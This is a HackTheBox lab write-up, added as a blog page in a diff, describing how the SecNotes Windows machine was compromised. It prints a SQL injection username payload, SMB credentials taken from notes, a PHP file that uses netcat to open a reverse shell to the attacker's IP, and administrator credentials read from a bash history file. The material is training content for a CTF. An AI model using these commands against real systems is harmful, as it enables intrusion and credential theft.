@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>SecNotes - Writeup</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://0x23b.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91628530-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-91628530-1');
+        </script>
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">SecNotes - Writeup</a>
+					
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://0x23b.github.io/">Home</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/about">About</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/tags/">Tags</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/posts/">Posts</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23b/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23b/"><i class="fa fa-twitter"></i></a></li>
+                            
+							<li class="navbar-icon"></li>
+
+                        </ul>
+						
+						<ul class="nav navbar-nav navbar-right">
+                        </ul>
+						
+						
+
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://0x23b.github.io/posts/hackthebox/2019-01-19-htb_secnotes_writeup/">SecNotes - Writeup</a></h4>
+    <h5>January 19, 2019</h5>
+    
+    <a href="https://0x23b.github.io/tags/hackthebox"><kbd class="item-tag">HackTheBox</kbd></a>
+    
+    <a href="https://0x23b.github.io/tags/writeups"><kbd class="item-tag">Writeups</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<h1 id="secnotes-writeup">SecNotes - Writeup</h1>
+
+<p><img src="https://www.hackthebox.eu/storage/avatars/50c8eaf2cd0fe953a71141b06bd88817.png" alt="SecNotes" /></p>
+
+<table>
+<thead>
+<tr>
+<th>OS</th>
+<th>Difficulty</th>
+<th>Points</th>
+<th>Release</th>
+<th>IP</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Windows</td>
+<td>Medium</td>
+<td>30</td>
+<td>25 Aug 2018</td>
+<td>10.10.10.97</td>
+</tr>
+</tbody>
+</table>
+
+<h2 id="summary">Summary</h2>
+
+<p>A medium machine which I solved the unintended way with a second order SQL injection vulnerability to get a initial foothold. This gives us credentials for the SMB share. There we can upload nc.exe and a php reverse shell. While on the box, we encounter a Windows Subsystem for Linux, which has .bash_history of the root user readable, that has the credentials of user Administrator inside.</p>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>First of all, let’s scan the machine for open ports. For this box it is necessary, that we do a full port scan, in order to find another http port, that allows us to trigger our uploaded reverse shell.</p>
+
+<pre><code class="language-bash">root@kali:~/HTB/SecNotes# nmap -sC -sV -oA full -p- 10.10.10.97
+# Nmap 7.70 scan initiated Tue Sep 18 16:10:57 2018 as: nmap -sC -sV -oA full -p- 10.10.10.97
+Nmap scan report for 10.10.10.97
+Host is up (0.16s latency).
+Not shown: 65532 filtered ports
+PORT     STATE SERVICE      VERSION
+80/tcp   open  http         Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+| http-title: Secure Notes - Login
+|_Requested resource was login.php
+445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
+8808/tcp open  http         Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows
+Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h20m01s, deviation: 4h02m31s, median: 0s
+| smb-os-discovery:
+|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
+|   OS CPE: cpe:/o:microsoft:windows_10::-
+|   Computer name: SECNOTES
+|   NetBIOS computer name: SECNOTES\x00
+|   Workgroup: HTB\x00
+|_  System time: 2018-09-18T13:28:12-07:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2018-09-18 16:28:09
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Sep 18 16:28:48 2018 -- 1 IP address (1 host up) scanned in 1071.51 seconds
+</code></pre>
+
+<p>There is a web server and smb running on the machine. On the web server, we can register a user and log in. While searching for vulnerabilities, I discovered, that the web application is vulnerable for second layer SQL injection. This means, that I have to register a user with a name, that is a payload for SQL injection. After loggin in, this name will trigger the injection. So I register a username with</p>
+
+<pre><code class="language-bash">' or 1=1 -- -
+</code></pre>
+
+<p>This gives me access to the notes. There we will find a note with access to share</p>
+
+<pre><code class="language-bash">\\secnotes.htb\new-site
+</code></pre>
+
+<p>with the credentials</p>
+
+<pre><code class="language-bash">tyler:92g!mA8BGjOirkL%OG*&amp;
+</code></pre>
+
+<p>We can access the share with</p>
+
+<pre><code class="language-bash">root@kali:~/HTB/SecNotes# smbclient -U tyler //10.10.10.97/new-site '92g!mA8BGjOirkL%OG*&amp;'
+</code></pre>
+
+<h2 id="reverse-shell">Reverse shell</h2>
+
+<p>We have to create a php file with the following content</p>
+
+<pre><code class="language-bash">&lt;?php
+system(&quot;nc.exe 10.10.15.71 445 -e cmd.exe&quot;);
+?&gt;
+</code></pre>
+
+<p>and upload it together with nc.exe to the share with</p>
+
+<pre><code class="language-bash">smb: \&gt; put 0x23b.php
+putting file 0x23b.php as \0x23b.php (0,8 kb/s) (average 0,8 kb/s)
+smb: \&gt; put nc.exe
+putting file nc.exe as \nc.exe (204,9 kb/s) (average 164,9 kb/s)
+</code></pre>
+
+<p>After setting up our nc listener, we can trigger the reverse shell with accessing the file over the web server on <a href="http://10.10.10.97:8808/0x23b.php">http://10.10.10.97:8808/0x23b.php</a></p>
+
+<pre><code class="language-bash">root@kali:~/HTB/SecNotes# nc -lvnp 445
+listening on [any] 445 ...
+connect to [10.10.15.71] from (UNKNOWN) [10.10.10.97] 49969
+Microsoft Windows [Version 10.0.17134.228]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\inetpub\new-site&gt;
+...
+C:\Users\tyler\Desktop&gt;more user.txt
+6f***************************f3
+</code></pre>
+
+<h2 id="root-txt">Root.txt</h2>
+
+<p>While on the machine, I discovered Ubuntu.zip under C: This meant for me, that Windows Subsystem for Linux must be installed on the box. This is a practical new feature Windows provides, so you can use a Linux system on Windows. The interesting part is, that the subsystem itself is accessible over</p>
+
+<pre><code class="language-bash">C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\
+</code></pre>
+
+<p>In the directory of the root user we can see and access .bash_history file, which contains interesting information for us:</p>
+
+<pre><code class="language-bash">C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root&gt;more .bash_history
+cd /mnt/c/
+ls
+cd Users/
+cd /
+cd ~
+ls
+pwd
+mkdir filesystem
+mount //127.0.0.1/c$ filesystem/
+sudo apt install cifs-utils
+mount //127.0.0.1/c$ filesystem/
+mount //127.0.0.1/c$ filesystem/ -o user=administrator
+cat /proc/filesystems
+sudo modprobe cifs
+smbclient
+apt install smbclient
+smbclient
+smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
+&gt; .bash_history
+less .bash_history
+exit
+</code></pre>
+
+<p>We can directly see, that there are another credentials visible. By using the same command with the IP address of the machine, we are able to logon to SMB as administrator and get the root flag:</p>
+
+<pre><code class="language-bash">root@kali:~/HTB/SecNotes# smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\10.10.10.97\\c$
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  $Recycle.Bin                      DHS        0  Thu Jun 21 18:24:29 2018
+  bootmgr                          AHSR   395268  Fri Jul 10 07:00:31 2015
+  BOOTNXT                           AHS        1  Fri Jul 10 07:00:31 2015
+  Distros                             D        0  Thu Jun 21 18:07:52 2018
+  Documents and Settings            DHS        0  Fri Jul 10 08:21:38 2015
+  inetpub                             D        0  Thu Jun 21 21:47:33 2018
+  Microsoft                           D        0  Fri Jun 22 17:09:10 2018
+  pagefile.sys                      AHS 738197504  Tue Sep 18 15:52:58 2018
+  PerfLogs                            D        0  Wed Apr 11 19:38:20 2018
+  php7                                D        0  Thu Jun 21 11:15:24 2018
+  Program Files                      DR        0  Sun Aug 19 17:56:49 2018
+  Program Files (x86)                DR        0  Thu Jun 21 21:47:33 2018
+  ProgramData                        DH        0  Sun Aug 19 17:56:49 2018
+  Recovery                          DHS        0  Thu Jun 21 17:52:17 2018
+  swapfile.sys                      AHS 268435456  Tue Sep 18 15:52:58 2018
+  System Volume Information         DHS        0  Thu Jun 21 17:53:13 2018
+  Ubuntu.zip                          A 201749452  Thu Jun 21 18:07:28 2018
+  Users                              DR        0  Thu Jun 21 18:00:39 2018
+  Windows                             D        0  Sun Aug 19 14:15:49 2018
+
+        12978687 blocks of size 4096. 7991056 blocks available
+
+smb: more Users\Administrators\Desktop\root.txt
+72****************************7b
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
